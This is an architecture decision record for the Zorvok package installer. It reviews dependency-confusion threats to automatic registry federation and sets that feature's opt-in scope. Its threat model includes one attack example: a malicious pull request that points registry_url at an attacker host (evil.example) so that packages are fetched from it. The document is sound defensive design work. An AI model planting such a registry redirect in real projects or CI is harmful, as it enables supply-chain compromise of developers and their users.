# ADR 0008: automatic federation — adversarial review and scope

## Status
Accepted (Milestone 6, fourth increment)

## Context
ARCHITECTURE.md §5 and every ADR from 0004 onward have gated "automatic" federation (Zorvok itself deciding to search its own registry, rather than a developer typing `--source` every time) behind a dependency-confusion adversarial review. This ADR is that review, done before writing the feature, and the resulting scope decision.

## Adversarial review

**Threat model**: a project runs `zorvok install --native` with automatic federation enabled. An attacker controls what gets published to the Zorvok registry (any of M3's verified-but-unvetted accounts can publish under any unclaimed name — "first publisher wins," no reserved-name or identity-verification policy beyond email verification). What can they achieve?

**S1 — name collision with an existing CocoaPods pod** (e.g. publish a malicious `Alamofire` to the Zorvok registry). If the project's Podfile also resolves `Alamofire` from the public CDN (the common case — most projects use well-known pods), both sources now have the same pod name. **Covered**: [ADR 0007](docs/adr/0007-federation-safety-fixes.md)'s ambiguity preflight check refuses to install any unpinned dependency resolvable from more than one source, regardless of whether those sources came from an explicit `--source` flag or automatic federation — the check doesn't distinguish, and shouldn't. Verified in this increment's tests that automatic federation doesn't bypass it.

**S2 — a name with no collision** (a plausible-sounding or mistyped name nothing else provides). Automatic federation makes the Zorvok registry a silent fallback for names not found elsewhere, with nothing to trigger ADR 0007's ambiguity check (there's no second source to collide with). **Not a novel risk**: this is the same exposure any single open registry already carries — the public CocoaPods CDN itself is exactly as vulnerable to a malicious pod published under a plausible unclaimed name, and the mitigation lives at the registry's own ownership/moderation layer (brief §9's "abuse protection," M3 scope), not in the installer's source-resolution logic. Federation doesn't make this worse; it's pre-existing, accepted industry-wide. Noted here explicitly so it isn't mistaken for something this ADR was supposed to fix.

**S3 — silently enabling federation on a victim's machine/CI** (e.g. a malicious PR that runs `zorvok config set registry_url https://evil.example/cdn/` before `zorvok install --native`). Requires the attacker to already have write access to run arbitrary config/CLI commands in that environment — at that point they could already do far more damage directly (edit the Podfile, run arbitrary build scripts). Not a meaningfully new attack surface beyond the CI/repo trust boundary every CocoaPods project (federated or not) already depends on.

**S4 — source-order tie-breaking.** Before ADR 0007, the question "does it matter whether the auto-added registry source is searched before or after an explicit `--source`" would have mattered — order decided silent ties. After ADR 0007, order is irrelevant to safety: any name collision is a hard refusal regardless of which source was added how.

## Decision
Automatic federation ships, scoped narrowly based on the review above:

1. **Opt-in by configuration, not by default.** `zorvok install --native` (no `--source` flags given) automatically adds the configured Zorvok registry (`registry_url` + `/cdn/`) as a candidate source — but **only if `registry_url` was explicitly set** via `zorvok config set registry_url ...` (project or global). The built-in fallback default (`http://localhost:8080`, used when nothing was ever configured) does **not** trigger automatic federation — someone who has configured nothing shouldn't have `--native` silently start making network calls to a registry they never set up. This keeps automatic federation an explicit, auditable, one-time project decision (setting `registry_url`), not a blanket default-on behavior.
2. **`--no-registry` opt-out.** For a `--native` invocation that should skip the configured registry even when one is set (offline development, deliberate isolation, debugging).
3. **Explicit `--source` still works exactly as before**, and is not combined with auto-added registry federation — if a developer specifies sources by hand, Zorvok respects exactly what they asked for rather than silently adding more.
4. **ADR 0007's ambiguity refusal is never weakened or bypassed** for automatically-added sources. This ADR does not reinstate the original, less-safe ADR 0003 draft rule ("a Zorvok-owned name always wins ties automatically") — that rule is superseded. Hard-refuse-on-ambiguity is the permanent policy, not an interim one; ADR 0003's federation-precedence section should be read with that correction in mind going forward.

## Consequences
- `zorvok install --native` now has three source configurations: none (identical to delegated), explicit `--source` (developer-specified), and automatic (configured `registry_url`, developer opted in once via `zorvok config set`).
- The registry still doesn't implement reserved names, publisher reputation, or any ownership-verification stronger than "verified email, first publisher wins" (M3). That remains out of scope for the installer-side work in this milestone — it's a registry-policy concern, not a resolution-mechanism one, per S2 above.
- `--no-registry` adds one more flag to `zorvok install --native`'s surface; documented in `zorvok help` and the flag-parsing error messages, same as `--source`/`--native` already are.
